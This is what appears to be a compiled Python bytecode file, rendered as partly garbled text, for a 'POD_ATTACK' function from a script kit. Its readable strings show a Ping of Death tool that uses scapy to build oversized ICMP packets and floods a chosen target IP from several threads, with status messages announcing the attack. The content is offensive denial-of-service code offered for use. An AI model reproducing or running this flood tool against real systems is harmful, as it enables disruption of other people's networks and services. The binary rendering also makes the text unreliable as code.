a
    [v?ar  ?                   @   sT   d dl Z d dlZd dlmZmZmZmZmZmZ d dl	m
Z
 d dlmZ dd? ZdS )?    N)?IP?ICMP?sendp?send?fragment?conf)?Threadc                    s?   da |? td? g }? fdd?}td| ?D ]4}tdt|? d ? t|d?}|??  |?|? q*t?|? |D ]}d	a |?	?  qntd
? d S )NFz%[1;34m[*][0m Starting POD attack...c                     sX   t ?td??d } t? d?tddd? |  }tsTtd?D ]}t|dd? td	? q8q,d S )
NZ$1234567890qwertyuiopasdfghjklzxcvbnmi`?  )Zdsti??  )?id?seq?   F)?verbosez[1;32m[+][0m Packet was sent!)	?random?choice?listr   r   ?FINISH?ranger   ?print)ZpayloadZpacket?i?Z	target_ip? ?2/storage/emulated/0/Script Vip/toolso/other/pod.py?	pod_flood   s    zPOD_ATTACK.<locals>.pod_floodr   z[1;34m[*][0m Staring thread z...)?targetTz [1;77m[i][0m Attack completed.)
r   r   r   ?strr   ?start?append?time?sleep?join)ZthreadsZattack_timer   Zthreads_listr   ?thread?tr   r   r   ?
POD_ATTACK
   s    


r!   )r   r   Z	scapy.allr   r   r   r   r   r   Z	threadingr   Ztoolso.randomDataZ
randomDatar!   r   r   r   r   ?<module>   s
    